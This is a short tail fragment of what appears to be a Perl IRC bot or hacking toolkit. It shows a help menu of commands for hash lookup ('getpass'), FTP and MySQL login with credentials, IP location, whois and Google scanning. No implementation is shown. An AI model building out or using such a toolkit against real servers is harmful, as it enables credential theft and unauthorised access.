[++] cmd_getpass <hash>
[++] cmd_kobra <page>
[++] cmd_ftp <host> <user> <pass>
[++] cmd_mysql <host> <user> <pass>
[++] cmd_locate <ip>
[++] cmd_whois <dom>
[++] cmd_navegator
[++] cmd_scangoogle
[++] cmd_help
[++] cmd_exit
);
    cprint "\n\n\n\x030";
}

#  The End ?